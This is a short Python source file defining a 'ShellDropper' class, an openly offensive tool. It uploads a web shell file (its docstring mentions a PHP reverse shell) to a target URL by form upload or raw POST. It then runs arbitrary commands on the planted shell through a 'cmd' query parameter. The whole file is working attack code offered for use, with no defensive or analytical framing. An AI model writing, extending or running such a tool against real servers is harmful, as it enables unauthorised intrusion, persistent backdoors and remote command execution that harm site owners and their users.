import requests
import logging
import base64

logger = logging.getLogger(__name__)

class ShellDropper:
    def __init__(self, target_url, upload_path=None):
        """
        target_url: URL where the shell file can be uploaded or executed
        upload_path: parameter name/key to upload file (if applicable)
        """
        self.target_url = target_url
        self.upload_path = upload_path

    def drop_shell(self, shell_code_path, shell_filename="shell.php"):
        """
        Upload or drop the shell to the target.
        shell_code_path: local path to shell code file (e.g., PHP reverse shell)
        shell_filename: filename to use on the target
        Returns True/False if successful.
        """
        try:
            with open(shell_code_path, "rb") as f:
                file_content = f.read()

            if self.upload_path:
                # Upload via multipart/form-data form POST upload
                files = {self.upload_path: (shell_filename, file_content, "application/octet-stream")}
                response = requests.post(self.target_url, files=files, timeout=15)
            else:
                # Directly POST shell content if applicable
                headers = {"Content-Type": "application/octet-stream"}
                response = requests.post(self.target_url, data=file_content, headers=headers, timeout=15)

            if response.status_code in [200, 201, 202]:
                logger.info("Shell dropped successfully.")
                return True
            else:
                logger.warning(f"Failed to drop shell, server returned status: {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Exception while dropping shell: {e}")
            return False

    def execute_shell(self, shell_url, command):
        """
        Execute a command on the dropped shell if accessible.
        shell_url: URL to the shell payload
        command: command string to execute (depends on shell)
        Returns the output or None.
        """
        try:
            params = {"cmd": command}  # assuming shell accepts 'cmd' param
            response = requests.get(shell_url, params=params, timeout=15)
            if response.status_code == 200:
                return response.text
            else:
                logger.warning(f"Failed to execute shell command, status: {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Exception during shell command execution: {e}")
            return None
